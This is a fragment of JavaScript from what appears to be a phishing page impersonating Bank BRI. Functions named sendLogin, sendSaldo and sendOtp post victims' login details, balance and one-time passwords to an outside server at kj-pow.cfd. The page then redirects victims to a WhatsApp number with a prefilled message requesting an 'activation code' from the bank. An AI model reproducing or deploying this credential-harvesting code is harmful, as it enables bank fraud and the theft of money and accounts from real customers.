...
function sendLogin() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/aku/login.php',
...
function sendSaldo() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/aku/saldo.php',
        data: $('#sald').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/aku/otp.php',
...
$(document).ready(function() {
 ...
 $('.load').fadeIn();
    setTimeout(function(){      
location.href='https://wa.me/6282240002169?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
 $("#process1").hide();
 $('.load').fadeOut();        
         }, 2000);
     });    
